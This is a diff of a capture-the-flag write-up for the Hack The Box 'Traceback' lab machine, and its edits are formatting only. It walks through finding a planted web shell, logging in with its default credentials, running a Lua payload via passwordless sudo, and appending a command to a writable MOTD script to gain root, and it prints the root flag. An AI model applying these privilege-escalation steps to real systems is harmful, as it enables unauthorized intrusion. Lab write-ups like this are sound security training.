@@ -19,7 +19,7 @@ Traceback is an easy Linux-based machine released on the 14th of March 2020 and 
 
 Nmap indicates us that the Traceback machine is running OpenSSH and Apache:
 
-```
+```raw
 $ nmap -A 10.10.10.181 | tee nmap.txt
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 19:03 IST
 Nmap scan report for 10.10.10.181
@@ -46,20 +46,20 @@ Let's have a look at the website available on port 80:
 
 The `index.html` page doesn't contain much but this HTML comment:
 
-```
+```html
 <center>
-	<h1>This site has been owned</h1>
-	<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
-	<h3> - Xh4H - </h3>
-	<!--Some of the best web shells that you might need ;)-->
+  <h1>This site has been owned</h1>
+  <h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
+  <h3> - Xh4H - </h3>
+  <!--Some of the best web shells that you might need ;)-->
 </center>
 ```
 
-It is definitely a hint. A quick search on DuckDuckGo with the keywords "Xh4H web shell" returns https://github.com/Xh4H/Web-Shells as first result. It is a Git repository full of web shells. One of them is certainly the one that the original attacker has left on the server!
+It is definitely a hint. A quick search on DuckDuckGo with the keywords "Xh4H web shell" returns [https://github.com/Xh4H/Web-Shells][web-shells] as first result. It is a Git repository full of web shells. One of them is certainly the one that the original attacker has left on the server!
 
-To create a wordlist with the web shells comprised in the Git repository, I called the [GitHub API](https://developer.github.com/v3/git/trees/#get-a-tree) with this one-liner command-line:
+To create a wordlist with the web shells comprised in the Git repository, I called the [GitHub API][github-api-trees] with this one-liner command-line:
 
-```
+```raw
 $ curl -s https://api.github.com/repos/Xh4H/Web-Shells/git/trees/4c9bade954938d56597325b872739c1a2463cf91 | jq -r .tree[].path | grep -vi readme | tee web-shells.txt
 alfa3.php
 alfav3.0.1.php
@@ -83,15 +83,15 @@ Then, I fuzzed the web server with this wordlist using ZAP:
 
 ![Output from ZAP's fuzzer with the list of web shells previously generated](/assets/images/htb-traceback-web-shells.png)
 
-And voila! The backdoor is accessible at http://10.10.10.181/smevk.php:
+And voila! The backdoor is accessible at [http://10.10.10.181/smevk.php][smevk-backdoor]:
 
 ![SmEvk web shell's login page](/assets/images/htb-traceback-smevk-login-page.png)
 
-The credentials `admin:admin` are hard-coded in the web shell: https://github.com/Xh4H/Web-Shells/blob/master/smevk.php#L14-L15.
+The credentials `admin:admin` are hard-coded in the web shell: [https://github.com/Xh4H/Web-Shells/blob/master/smevk.php#L14-L15][smevk-credentials].
 
 Then, I used the terminal available in the "Console" tab to poke around a little:
 
-```
+```raw
 $ id
 uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
 $ cat /home/webadmin/note.txt
@@ -103,7 +103,7 @@ Contact me if you have any question.
 
 A Lua tool?
 
-```
+```raw
 $ cat /home/webadmin/.bash_history
 ls -la
 sudo -l
@@ -121,15 +121,15 @@ User webadmin may run the following commands on traceback:
 
 It indeed seems that the `webadmin` user can execute `/home/sysadmin/luvit` on behalf of `sysadmin` without password.
 
-[Luvit](https://luvit.io/) is a program which "implements the same APIs as Node.js, but in Lua!". We can therefore use it to execute Lua payloads. We fill prepare one for reading the user flag:
+[Luvit][luvit] is a program which "implements the same APIs as Node.js, but in Lua!". We can therefore use it to execute Lua payloads. We fill prepare one for reading the user flag:
 
-```
+```raw
 $ printf 'file = io.open("/home/sysadmin/user.txt", "r")\nio.input(file)\nprint(io.read())\nio.close(file)\n' > /tmp/read_flag.lua
 ```
 
 And then:
 
-```
+```raw
 $ sudo -u sysadmin /home/sysadmin/luvit /tmp/read_flag.lua
 ```
 
@@ -141,7 +141,7 @@ Before going further, I wanted to get a "real" shell so I added an SSH public ke
 
 During the rest of my investigation, something caught my attention:
 
-```
+```raw
 $ find / -type f -writable 2>/dev/null | grep -v '^/proc' | grep -v '^/sys'
 /etc/update-motd.d/50-motd-news
 /etc/update-motd.d/10-help-text
@@ -160,8 +160,8 @@ $ find / -type f -writable 2>/dev/null | grep -v '^/proc' | grep -v '^/sys'
 
 The `sysadmin` user can edit the MOTD scripts!
 
-```
-sysadmin@traceback:~$ ls -al /etc/update-motd.d/
+```raw
+$ ls -al /etc/update-motd.d/
 total 32
 drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
 drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
@@ -174,7 +174,7 @@ drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
 
 This is really bad (for the server's owner at least) because these scripts are executed upon any new SSH connection as defined in `/etc/pam.d/sshd`:
 
-```
+```raw
 ...
 # Print the message of the day upon successful login.
 # This includes a dynamically generated part from /run/motd.dynamic
@@ -186,15 +186,14 @@ session    optional     pam_motd.so noupdate
 
 All I need is to modify one of those scripts to print the root flag:
 
-```
+```raw
 $ echo 'cat /root/root.txt' >> /etc/update-motd.d/00-header
 ```
 
 And when one logs in via SSH:
 
-```
-$ ssh -o PasswordAuthentication=no -i ~/.ssh/tr
-aceback sysadmin@10.10.10.181
+```raw
+$ ssh -o PasswordAuthentication=no -i ~/.ssh/traceback sysadmin@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
 - I guess stuff could have been configured better ^^ -
@@ -212,3 +211,9 @@ $
 ```
 
 The root flag was `fa6d76ff6866c37f381b5f6e40f8ce89`.
+
+ [github-api-trees]: https://developer.github.com/v3/git/trees/#get-a-tree
+ [luvit]: https://luvit.io/
+ [smevk-backdoor]: http://10.10.10.181/smevk.php
+ [smevk-credentials]: https://github.com/Xh4H/Web-Shells/blob/master/smevk.php#L14-L15
+ [web-shells]: https://github.com/Xh4H/Web-Shells
